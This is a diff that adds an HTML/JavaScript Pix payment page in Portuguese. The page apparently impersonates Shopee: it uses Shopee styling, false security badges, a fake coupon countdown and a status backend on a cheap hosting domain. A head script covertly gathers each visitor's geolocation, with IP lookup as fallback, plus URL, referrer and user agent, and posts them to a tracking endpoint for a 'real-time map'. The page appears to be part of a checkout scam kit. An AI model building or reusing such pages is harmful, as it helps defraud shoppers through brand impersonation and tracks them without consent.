@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Finalização de Compra</title>
+  <script>
+    window.pixelId = "69504c70898e23c8d3abda84";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+ <script
+ src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+ data-utmify-prevent-xcod-sck
+ data-utmify-prevent-subids
+ async
+ defer
+></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+  <style>
+    :root {
+      --shopee-orange: #EE4D2D;
+      --shopee-orange-dark: #D73211;
+      --shopee-orange-light: #FFF4F2;
+      --shopee-gray: #F5F5F5;
+      --shopee-text: #333;
+      --shopee-text-light: #757575;
+    }
+
+    body,
+    html {
+      overflow-x: hidden !important;
+      background-color: var(--shopee-gray);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    .mensagem-slide {
+      position: relative;
+      height: 1.25rem;
+      overflow: hidden;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .mensagem-slide span {
+      position: absolute;
+      left: 0;
+      right: 0;
+      margin: 0 auto;
+      text-align: center;
+      white-space: nowrap;
+      opacity: 0;
+      animation: fadeMsg 9s infinite;
+      transform: none;
+    }
+
+    .mensagem-slide span:nth-child(1) {
+      animation-delay: 0s;
+    }
+
+    .mensagem-slide span:nth-child(2) {
+      animation-delay: 3s;
+    }
+
+    .mensagem-slide span:nth-child(3) {
+      animation-delay: 6s;
+    }
+
+    @keyframes fadeMsg {
+      0% {
+        opacity: 0;
+      }
+
+      8% {
+        opacity: 1;
+      }
+
+      33% {
+        opacity: 1;
+      }
+
+      41% {
+        opacity: 0;
+      }
+
+      100% {
+        opacity: 0;
+      }
+    }
+
+    .toast-center {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(.98);
+      min-width: 240px;
+      max-width: 90vw;
+      background: #3a3a3a;
+      color: #fff;
+      padding: 16px 20px;
+      border-radius: 14px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .25);
+      z-index: 9999;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .25s ease, transform .25s ease;
+    }
+
+    .toast-center.show {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    /* Shopee-style cards */
+    .shopee-card {
+      background: white;
+      border-radius: 4px;
+      box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(0, 0, 0, 0.09);
+    }
+
+    /* Shopee-style buttons */
+    .btn-shopee {
+      background-color: var(--shopee-orange);
+      color: white;
+      border: none;
+      border-radius: 2px;
+      font-weight: 500;
+      transition: background-color 0.2s;
+    }
+
+    .btn-shopee:hover {
+      background-color: var(--shopee-orange-dark);
+    }
+
+    .btn-shopee:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+  </style>
+<!-- Rastreamento LED para mapa em tempo real -->
+<script>
+(async function() {
+  const TRACK_ENDPOINT = ''; // endpoint novo
+  const SLUG = 'payment'; // identificador da etapa payment
+
+  async function getLocation() {
+    let loc = await new Promise(resolve => {
+      if (!navigator.geolocation) return resolve({});
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+        () => resolve({})
+      );
+    });
+    if (!loc.lat || !loc.lng) {
+      try {
+        const resp = await fetch('https://ipapi.co/json/');
+        if (resp.ok) {
+          const data = await resp.json();
+          if (data.latitude && data.longitude) {
+            loc = { lat: data.latitude, lng: data.longitude };
+          }
+        }
+      } catch (e) {}
+    }
+    return loc;
+  }
+
+  async function trackVisitor(stage) {
+    const loc = await getLocation();
+    if (!loc.lat || !loc.lng) return;
+    const payload = {
+      slug: SLUG,
+      stage: stage || 'pix',
+      lat: loc.lat,
+      lng: loc.lng,
+      url: window.location.href,
+      ref: document.referrer || '',
+      ua: navigator.userAgent
+    };
+    fetch(TRACK_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  trackVisitor('pix');
+})();
+</script>
+</head>
+
+<body class="text-sm" style="background-color: var(--shopee-gray); color: var(--shopee-text);">
+  <header class="fixed top-0 left-0 right-0 bg-white z-50 border-b" style="border-color: rgba(0,0,0,0.09); box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);">
+    <div class="max-w-6xl mx-auto px-4 py-3 flex items-center">
+      <button type="button" onclick="history.back()" class="text-xl mr-4 text-gray-600 hover:text-gray-900">
+        <i class="fas fa-chevron-left"></i>
+      </button>
+      <div class="flex items-center gap-3 flex-1">
+        <img src="https://i.ibb.co/j9tP45B1/IMG-3379.jpg" alt="Logo" class="h-10 object-contain" onerror="this.style.display='none'">
+        <div class="flex-1">
+          <h1 class="font-semibold text-base" style="color: var(--shopee-text);">Realizar pagamento</h1>
+          <div class="text-xs mensagem-slide" style="color: var(--shopee-orange);">
+            <span><i class="fas fa-shield-alt mr-1"></i> Pagamento 100% seguro</span>
+            <span><i class="fas fa-lock mr-1"></i> Dados criptografados</span>
+            <span><i class="fas fa-check-circle mr-1"></i> Compra garantida</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="pt-20 pb-36">
+    <div class="max-w-6xl mx-auto px-4 py-4 space-y-4">
+      <!-- Banner de confirmação antes do resumo: mensagem + imagem -->
+      <section class="shopee-card px-4 py-6 text-center">
+        <h2 class="text-lg font-semibold" style="color: var(--shopee-text);">Já é quase seu…</h2>
+        <p class="text-sm mt-1" style="color: var(--shopee-text-light);">Pague seu Pix dentro de 30 minutos para garantir sua compra.</p>
+        <img id="hero-pix-imao-celular.pngmage" src="mao-celular.png" alt="Pagamento por Pix no celular"
+          class="mx-auto mt-4 w-full max-w-[170px] rounded-md">
+        <h2 class="text-lg font-semibold mt-4" style="color: var(--shopee-text);">Aguardando Pagamento...</h2>
+      </section>
+
+    <!-- Resumo visual do carrinho oculto, mantemos apenas para não quebrar a lógica -->
+    <div id="carrinhoContainer" class="mx-4 hidden" aria-hidden="true"></div>
+
+
+
+    <div id="qr-root" class="max-w-3xl mx-auto px-4"></div>
+
+      <section class="shopee-card p-5 space-y-4">
+        <h3 class="text-lg font-semibold" style="color: var(--shopee-text);">Como pagar com Pix (copia e cola)</h3>
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
+          <article class="relative shopee-card p-4">
+            <span class="absolute -top-3 -left-3 inline-flex items-center justify-center w-8 h-8 rounded-full text-white text-sm font-bold" style="background-color: var(--shopee-orange);">1</span>
+            <div class="flex items-start gap-3">
+              <i class="fas fa-copy text-lg" style="color: var(--shopee-text);"></i>
+              <div>
+                <h4 class="font-semibold" style="color: var(--shopee-text);">Copie o código</h4>
+                <p class="text-xs" style="color: var(--shopee-text-light);">Use o botão copiar para levar o código Pix.</p>
+              </div>
+            </div>
+          </article>
+          <article class="relative shopee-card p-4">
+            <span class="absolute -top-3 -left-3 inline-flex items-center justify-center w-8 h-8 rounded-full text-white text-sm font-bold" style="background-color: var(--shopee-orange);">2</span>
+            <div class="flex items-start gap-3">
+              <i class="fas fa-mobile-screen text-lg" style="color: var(--shopee-text);"></i>
+              <div>
+                <h4 class="font-semibold" style="color: var(--shopee-text);">Abra o app do banco</h4>
+                <p class="text-xs" style="color: var(--shopee-text-light);">Entre no aplicativo financeiro onde deseja pagar.</p>
+              </div>
+            </div>
+          </article>
+          <article class="relative shopee-card p-4">
+            <span class="absolute -top-3 -left-3 inline-flex items-center justify-center w-8 h-8 rounded-full text-white text-sm font-bold" style="background-color: var(--shopee-orange);">3</span>
+            <div class="flex items-start gap-3">
+              <i class="fas fa-paste text-lg" style="color: var(--shopee-text);"></i>
+              <div>
+                <h4 class="font-semibold" style="color: var(--shopee-text);">Pix &gt; Copia e cola</h4>
+                <p class="text-xs" style="color: var(--shopee-text-light);">Cole o código na opção Pix copia e cola.</p>
+              </div>
+            </div>
+          </article>
+          <article class="relative shopee-card p-4">
+            <span class="absolute -top-3 -left-3 inline-flex items-center justify-center w-8 h-8 rounded-full text-white text-sm font-bold" style="background-color: var(--shopee-orange);">4</span>
+            <div class="flex items-start gap-3">
+              <i class="fas fa-info-circle text-lg" style="color: var(--shopee-text);"></i>
+              <div>
+                <h4 class="font-semibold" style="color: var(--shopee-text);">Confira os dados</h4>
+                <p class="text-xs" style="color: var(--shopee-text-light);">Verifique recebedor e valor antes de confirmar.</p>
+              </div>
+            </div>
+          </article>
+          <article class="relative shopee-card p-4">
+            <span class="absolute -top-3 -left-3 inline-flex items-center justify-center w-8 h-8 rounded-full text-white text-sm font-bold" style="background-color: var(--shopee-orange);">5</span>
+            <div class="flex items-start gap-3">
+              <i class="fas fa-check-circle text-lg" style="color: var(--shopee-text);"></i>
+              <div>
+                <h4 class="font-semibold" style="color: var(--shopee-text);">Conclua o pagamento</h4>
+                <p class="text-xs" style="color: var(--shopee-text-light);">Finalize e guarde o comprovante para acompanhamento.</p>
+              </div>
+            </div>
+          </article>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <footer class="fixed bottom-0 left-0 right-0 bg-white border-t" style="border-color: rgba(0,0,0,0.09); box-shadow: 0 -1px 2px 0 rgba(0,0,0,0.1);">
+    <div class="max-w-6xl mx-auto">
+      <div class="px-4 py-2 text-xs text-center" style="background-color: var(--shopee-orange-light); color: var(--shopee-orange);">
+        <i class="fas fa-gift mr-1"></i> Você está economizando <span id="desconto-1">R$ 0,00</span> neste pedido.
+      </div>
+      <div class="flex justify-between items-center px-4 pt-2 pb-1">
+        <p class="text-xs" style="color: var(--shopee-text-light);">Total (<span id="quantidade_x">0 itens</span>)</p>
+        <p class="text-lg font-bold" id="total1" style="color: var(--shopee-orange);">R$ 0,00</p>
+      </div>
+      <button type="button" class="btn-shopee w-full py-3 text-sm font-semibold" disabled style="opacity: 0.6;">
+        <span id="contador">O cupom expira em 05:00:00</span>
+      </button>
+    </div>
+  </footer>
+
+  <div id="toastContainer"></div>
+
+  <script>
+    (function () {
+      const container = document.getElementById('carrinhoContainer');
+      const descontoEls = [document.getElementById('desconto-1'), document.getElementById('desconto-2'), document.getElementById('desconto-3')];
+      const totalCarrinhoEl = document.getElementById('total-carrinho');
+      const totalEl = document.getElementById('total');
+      const totalFooterEl = document.getElementById('total1');
+      const freteEl = document.getElementById('total-frete');
+      const quantidadeEl = document.getElementById('quantidade_x');
+      const compradorEl = document.getElementById('compradorResumo');
+      const entregaEl = document.getElementById('entregaResumo');
+      const placeholderImg = 'https://via.placeholder.com/160x160.png?text=Produto';
+      const esc = (value) => (value || value === 0) ? String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;') : '';
+      const formatBRL = (value) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(Number(value || 0));
+      function loadOrder() {
+        try {
+          const raw = sessionStorage.getItem('checkoutOrdem');
+          if (!raw) return null;
+          const order = JSON.parse(raw);
+          if (!order || !Array.isArray(order.carrinho)) return null;
+          return order;
+        } catch (error) {
+          console.error('Erro ao ler checkoutOrdem:', error);
+          return null;
+        }
+      }
+      function resolveImage(path) {
+        if (!path) return placeholderImg;
+        if (/^https?:/i.test(path)) return path;
+        if (path.startsWith('/')) return path;
+        return path;
+      }
+      function computeTotals(order) {
+        const carrinho = Array.isArray(order.carrinho) ? order.carrinho : [];
+        let subtotal = typeof order.subtotal === 'number' ? order.subtotal : 0;
+        if (!subtotal) subtotal = carrinho.reduce((acc, item) => acc + Number(item.preco || 0) * Number(item.quantidade || 1), 0);
+        let desconto = typeof order.desconto === 'number' ? order.desconto : null;
+        if (desconto === null) {
+          desconto = carrinho.reduce((acc, item) => {
+            const preco = Number(item.preco || 0);
+            const comparacao = Number(item.preco_comparacao || 0);
+            const qtd = Number(item.quantidade || 1);
+            if (comparacao > preco) acc += (comparacao - preco) * qtd;
+            return acc;
+          }, 0);
+        }
+        if (desconto < 0) desconto = 0;
+        const freteValor = order.frete ? Number(order.frete.preco || 0) : 0;
+        let total = typeof order.total === 'number' ? order.total : Math.max(subtotal - desconto, 0) + freteValor;
+        if (total < 0) total = 0;
+        const itens = carrinho.reduce((acc, item) => acc + Number(item.quantidade || 1), 0);
+        return { subtotal, desconto, freteValor, total, itens };
+      }
+      function renderItens(carrinho) {
+        return carrinho.map((item) => {
+          const nome = item.produtoTitulo || item.nomeProduto || item.produto || item.nome || item.titulo || 'Produto';
+          const variation = item.variacaoLabel || item.variacaoTitulo || (item.variacao && item.variacao.titulo) || (item.variacao && item.variacao.info) || (item.variacao ? item.variacao : '');
+          const preco = Number(item.preco || 0);
+          const precoComparacao = Number(item.preco_comparacao || 0);
+          const quantidade = Number(item.quantidade || 1);
+          const subtotal = preco * quantidade;
+          const imagem = resolveImage(item.imagem);
+          return `
+            <div class="flex items-start gap-4 px-4 py-3 border-t" style="border-color: rgba(0,0,0,0.09);">
+              <img src="${esc(imagem)}" alt="${esc(nome)}" class="w-20 h-20 object-contain rounded border bg-white" style="border-color: rgba(0,0,0,0.09);">
+              <div class="flex-1 space-y-2">
+                <div>
+                  <p class="font-semibold text-sm" style="color: var(--shopee-text);">${esc(nome)}</p>
+                  ${variation ? `<p class="text-xs" style="color: var(--shopee-text-light);">${esc(variation)}</p>` : ''}
+                </div>
+                <div class="flex justify-between items-end">
+                  <div>
+                    <p class="font-semibold text-sm" style="color: var(--shopee-orange);">${formatBRL(preco)}</p>
+                    ${precoComparacao > preco ? `<p class="text-xs line-through" style="color: var(--shopee-text-light);">${formatBRL(precoComparacao)}</p>` : ''}
+                    <p class="text-xs" style="color: var(--shopee-text-light);">Qtd: ${quantidade}</p>
+                  </div>
+                  <div class="text-sm font-semibold" style="color: var(--shopee-text);">${formatBRL(subtotal)}</div>
+                </div>
+              </div>
+            </div>
+          `;
+        }).join('');
+      }
+      function renderResumo(order, totals) {
+        if (!container) return; // Sem container visível, não renderiza, mas mantém a lógica do total
+        const carrinho = Array.isArray(order.carrinho) ? order.carrinho : [];
+        if (!carrinho.length) {
+          container.innerHTML = `<section class="shopee-card px-4 py-6"><p class="text-sm" style="color: var(--shopee-text-light);">Não foi possível localizar os itens do pedido. Volte ao checkout e tente novamente.</p></section>`;
+          return;
+        }
+        const totalItensTxt = totals.itens === 1 ? '1 item' : `${totals.itens} itens`;
+        const nomePrincipal = carrinho[0]?.produtoTitulo || carrinho[0]?.nomeProduto || carrinho[0]?.titulo || 'Produtos selecionados';
+        container.innerHTML = `
+          <section class="shopee-card">
+            <div class="px-4 py-3 flex justify-between items-center border-b" style="border-color: rgba(0,0,0,0.09);">
+              <div>
+                <h2 class="font-semibold text-sm" style="color: var(--shopee-text);">${esc(nomePrincipal)}</h2>
+                <p class="text-xs" style="color: var(--shopee-text-light);">${esc(totalItensTxt)}</p>
+              </div>
+            </div>
+            <div>
+              ${renderItens(carrinho)}
+            </div>
+          </section>
+        `;
+      }
+      function preencherDados(comprador, entrega) {
+        if (compradorEl) {
+          if (comprador && (comprador.nome || comprador.email || comprador.telefone)) {
+            compradorEl.innerHTML = `
+              ${comprador.nome ? `<p><strong>Nome:</strong> ${esc(comprador.nome)}</p>` : ''}
+              ${comprador.email ? `<p><strong>Email:</strong> ${esc(comprador.email)}</p>` : ''}
+              ${comprador.telefone ? `<p><strong>Telefone:</strong> ${esc(comprador.telefone)}</p>` : ''}
+              ${comprador.cpf ? `<p><strong>CPF/CNPJ:</strong> ${esc(comprador.cpf)}</p>` : ''}
+            `;
+          } else {
+            compradorEl.innerHTML = '<p class="text-xs" style="color: var(--shopee-text-light);">Dados não informados.</p>';
+          }
+        }
+        if (entregaEl) {
+          if (entrega && (entrega.endereco || entrega.cep)) {
+            entregaEl.innerHTML = `
+              ${entrega.cep ? `<p><strong>CEP:</strong> ${esc(entrega.cep)}</p>` : ''}
+              ${entrega.endereco ? `<p><strong>Endereço:</strong> ${esc(entrega.endereco)}</p>` : ''}
+              ${(entrega.cidade || entrega.estado) ? `<p><strong>Cidade/UF:</strong> ${esc([entrega.cidade, entrega.estado].filter(Boolean).join(' / '))}</p>` : ''}
+            `;
+          } else {
+            entregaEl.innerHTML = '<p class="text-xs" style="color: var(--shopee-text-light);">Endereço não informado.</p>';
+          }
+        }
+      }
+      function initQRCode() {
+        const root = document.getElementById('qr-root');
+        if (!root) return;
+        const box = document.createElement('div');
+        box.className = 'shopee-card p-4';
+        // ...log visual removido...
+        box.innerHTML += `
+    <h2 class="text-lg font-semibold mb-1" style="color: var(--shopee-text);">Pagamento via Pix</h2>
+    <p class="text-xs mb-3" style="color: var(--shopee-text-light);">Use o QR Code ou copie o código Pix abaixo:</p>
+    <div id="pix-img-wrap" class="mb-4 flex justify-center"></div>
+    <div class="flex justify-center">
+      <input type="text" id="qr-text" readonly class="w-full max-w-md mx-auto px-4 py-2.5 text-xs font-mono bg-white truncate shadow-inner" style="border: 1px solid rgba(0,0,0,0.14); border-radius: 20px; color: var(--shopee-text);" />
+    </div>
+    <div class="mt-3">
+      <button type="button" id="qr-copy" class="btn-shopee w-full flex items-center justify-center gap-2 text-sm font-semibold py-3">
+        <i class="fas fa-copy"></i>
+        Copiar código Pix
+      </button>
+      <span id="qr-feedback" class="block mt-2 text-xs text-center" style="color: var(--shopee-text-light);"></span>
+    </div>
+  `;
+        root.appendChild(box);
+
+        const feedback = box.querySelector('#qr-feedback');
+        const textarea = box.querySelector('#qr-text');
+        const copyBtn = box.querySelector('#qr-copy');
+        const imgWrap = box.querySelector('#pix-img-wrap');
+
+        // Carrega QR e imagem do QR da sessionStorage
+        // gerarpix.php retorna: { success: true, pix_code: "...", transaction_id: "...", amount: ... }
+        try {
+          const order = JSON.parse(sessionStorage.getItem('checkoutOrdem'));
+          let pixCode = null;
+
+          // Prioridade: pixCode salvo diretamente pelo checkout (já processado pelo gerarpix.php)
+          if (order?.pixCode) {
+            pixCode = order.pixCode;
+          }
+          // Fallback: tenta do objeto pix (resposta do gerarpix.php)
+          else if (order?.pix?.pix_code) {
+            pixCode = order.pix.pix_code;
+          }
+          // Fallback: tenta da resposta completa da API
+          else if (order?.apiResponse?.pix_code) {
+            pixCode = order.apiResponse.pix_code;
+          }
+
+          // Atualiza sessionStorage para manter compatível
+          if (pixCode) {
+            order.pixCode = pixCode;
+            sessionStorage.setItem('checkoutOrdem', JSON.stringify(order));
+            textarea.value = pixCode;
+            textarea.addEventListener('click', () => {
+              try { textarea.select(); } catch (e) { }
+            });
+            feedback.textContent = 'Copie o código Pix abaixo para pagar.';
+            feedback.style.color = '#00C853';
+            
+            // Gera QR Code usando API qrserver.com
+            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(pixCode)}`;
+            const qrImg = document.createElement('img');
+            qrImg.src = qrCodeUrl;
+            qrImg.alt = 'QR Code Pix';
+            qrImg.className = 'max-w-xs w-full border rounded mx-auto';
+            qrImg.style.borderColor = 'rgba(0,0,0,0.09)';
+            qrImg.style.backgroundColor = 'white';
+            qrImg.style.padding = '8px';
+            imgWrap.innerHTML = ''; // Limpa qualquer conteúdo anterior
+            imgWrap.appendChild(qrImg);
+          } else {
+            feedback.textContent = 'Código Pix não encontrado.';
+            feedback.style.color = 'var(--shopee-orange)';
+          }
+
+        } catch (e) {
+          feedback.textContent = 'Erro ao carregar código Pix.';
+          feedback.style.color = 'var(--shopee-orange)';
+        }
+
+        copyBtn.addEventListener('click', async () => {
+          try {
+            if (!textarea.value) {
+              feedback.textContent = 'Código Pix não disponível.';
+              feedback.style.color = 'var(--shopee-orange)';
+              return;
+            }
+            
+            await navigator.clipboard.writeText(textarea.value);
+            
+            // Feedback visual temporário
+            const originalText = copyBtn.innerHTML;
+            copyBtn.innerHTML = '<i class="fas fa-check"></i> Código copiado!';
+            copyBtn.style.backgroundColor = '#00C853';
+            
+            feedback.textContent = 'Código copiado com sucesso! Você pode copiar novamente se precisar.';
+            feedback.style.color = '#00C853';
+            
+            // Restaura o botão após 2 segundos
+            setTimeout(() => {
+              copyBtn.innerHTML = originalText;
+              copyBtn.style.backgroundColor = '';
+              feedback.textContent = '';
+              feedback.style.color = '';
+            }, 2000);
+          } catch (error) {
+            // Fallback: seleciona o texto para copiar manualmente
+            try {
+              textarea.select();
+              textarea.setSelectionRange(0, 99999); // Para mobile
+              document.execCommand('copy');
+              feedback.textContent = 'Código selecionado! Pressione Ctrl+C para copiar.';
+              feedback.style.color = '#00C853';
+            } catch (fallbackError) {
+              feedback.textContent = 'Erro ao copiar código. Selecione e copie manualmente.';
+              feedback.style.color = 'var(--shopee-orange)';
+            }
+          }
+          
+          // Limpa feedback após 3 segundos
+          setTimeout(() => {
+            if (feedback.textContent && (feedback.textContent.includes('copiado') || feedback.textContent.includes('selecionado'))) {
+              feedback.textContent = '';
+              feedback.style.color = '';
+            }
+          }, 3000);
+        });
+      }
+
+      function iniciarContador() {
+        let segundos = 5 * 3600;
+        const span = document.getElementById('contador');
+        if (!span) return;
+        const tick = () => {
+          if (segundos <= 0) {
+            span.textContent = 'O cupom expirou';
+            return;
+          }
+          const horas = String(Math.floor(segundos / 3600)).padStart(2, '0');
+          const minutos = String(Math.floor((segundos % 3600) / 60)).padStart(2, '0');
+          const secs = String(segundos % 60).padStart(2, '0');
+          span.textContent = `O cupom expira em ${horas}:${minutos}:${secs}`;
+          segundos -= 1;
+          setTimeout(tick, 1000);
+        };
+        tick();
+      }
+      const order = loadOrder();
+
+      // gerarpix.php retorna transaction_id (id da transação)
+      const transactionId = order?.transactionId || order?.pix?.transaction_id || order?.apiResponse?.transaction_id;
+      if (transactionId) {
+        const intervalo = setInterval(async () => {
+          try {
+            // Consulta o status do pedido no backend usando status.php
+            const res = await fetch(`https://deeppink-wallaby-233642.hostingersite.com/status.php?transactionId=${encodeURIComponent(transactionId)}`);
+            const json = await res.json();
+            // status.php retorna: 
+            // { success: true, paid: true/false, status: "...", transaction: {...}, data: {...}, response: {...} }
+            // status.php mapeia status para: 'paid', 'approved', 'completed', 'success', 'pago', 'aprovado'
+            const isPaid = json?.paid === true;
+            const status = (json?.status || '').toLowerCase();
+            
+            // Verifica se o pagamento foi aprovado
+            if (isPaid || ['paid', 'approved', 'completed', 'success', 'pago', 'aprovado'].includes(status)) {
+              clearInterval(intervalo);
+              
+              // ✅ DISPARA Purchase/CompletePayment APENAS APÓS CONFIRMAÇÃO REAL DO PAGAMENTO
+              const totals = computeTotals(order);
+              const purchaseValue = Number(totals.total || 0);
+              
+              // TikTok Pixel
+              if (typeof ttq !== 'undefined') {
+                try {
+                  ttq.track('CompletePayment', {
+                    value: purchaseValue,
+                    currency: 'BRL',
+                    contents: transactionId ? [{ content_id: transactionId }] : undefined
+                  });
+                  console.log('✅ TikTok Pixel - CompletePayment disparado após confirmação do pagamento');
+                } catch (e) {
+                  console.error('❌ Erro ao disparar TikTok CompletePayment:', e);
+                }
+              }
+
+              // Meta Pixel (se disponível via UTMify)
+              if (typeof fbq !== 'undefined') {
+                try {
+                  fbq('track', 'Purchase', {
+                    value: purchaseValue,
+                    currency: 'BRL',
+                    contents: transactionId ? [{ id: transactionId }] : undefined
+                  });
+                  console.log('✅ Meta Pixel - Purchase disparado após confirmação do pagamento');
+                } catch (e) {
+                  console.error('❌ Erro ao disparar Meta Purchase:', e);
+                }
+              }
+
+              // Mostra animação/mensagem de sucesso
+              const body = document.body;
+              const overlay = document.createElement('div');
+              overlay.style.position = 'fixed';
+              overlay.style.top = 0;
+              overlay.style.left = 0;
+              overlay.style.width = '100vw';
+              overlay.style.height = '100vh';
+              overlay.style.background = 'rgba(0,0,0,0.7)';
+              overlay.style.display = 'flex';
+              overlay.style.alignItems = 'center';
+              overlay.style.justifyContent = 'center';
+              overlay.style.zIndex = 99999;
+              overlay.innerHTML = `
+                <div style="background: #fff; border-radius: 18px; padding: 40px 32px; box-shadow: 0 8px 32px rgba(0,0,0,0.18); text-align: center; max-width: 90vw;">
+                  <div style="font-size: 3rem; color: #00C853; margin-bottom: 16px;">
+                    <i class='fas fa-check-circle'></i>
+                  </div>
+                  <h2 style="font-size: 1.5rem; color: #00C853; margin-bottom: 8px;">Pedido pago com sucesso!</h2>
+                  <p style="font-size: 1rem; color: var(--shopee-text); margin-bottom: 18px;">Redirecionando para a nota fiscal...</p>
+                  <div class="loader" style="margin: 0 auto; border: 4px solid #e5e7eb; border-top: 4px solid #00C853; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
+                  <style>@keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }</style>
+                </div>
+              `;
+              body.appendChild(overlay);
+              setTimeout(() => {
+                // Redireciona para NF/ quando pagamento confirmado
+                window.location.href = '../NF/';
+              }, 2200);
+            }
+          } catch (e) {
+            console.warn('Erro consultando status do pedido:', e);
+          }
+        }, 8000); // Verifica a cada 8 segundos
+      }
+
+
+      if (!order || !Array.isArray(order.carrinho) || order.carrinho.length === 0) {
+        if (container) {
+          container.innerHTML = `<section class="shopee-card px-4 py-6"><p class="text-sm" style="color: var(--shopee-text-light);">Pedido não encontrado. Volte ao checkout para gerar o QR Code novamente.</p></section>`;
+        }
+        initQRCode();
+        iniciarContador();
+        return;
+      }
+
+      const totals = computeTotals(order);
+      if (container) renderResumo(order, totals);
+      descontoEls.forEach(el => el && (el.textContent = formatBRL(totals.desconto)));
+      if (totalCarrinhoEl) totalCarrinhoEl.textContent = formatBRL(totals.subtotal);
+      if (totalEl) totalEl.textContent = formatBRL(totals.total);
+      if (totalFooterEl) totalFooterEl.textContent = formatBRL(totals.total);
+      if (freteEl) freteEl.textContent = order.frete ? `${esc(order.frete.titulo)} (${formatBRL(order.frete.preco || 0)})` : 'Frete não selecionado';
+      if (quantidadeEl) quantidadeEl.textContent = totals.itens === 1 ? '1 item' : `${totals.itens} itens`;
+      preencherDados(order.comprador || {}, order.entrega || {});
+      
+      // ❌ REMOVIDO: Purchase NÃO deve disparar no carregamento da página
+      // O evento de compra só deve disparar APÓS confirmação real do pagamento
+      // (ver abaixo onde isPaid === true)
+      
+      initQRCode();
+      iniciarContador();
+
+    })();
+  </script>
+</body>
+
+</html>
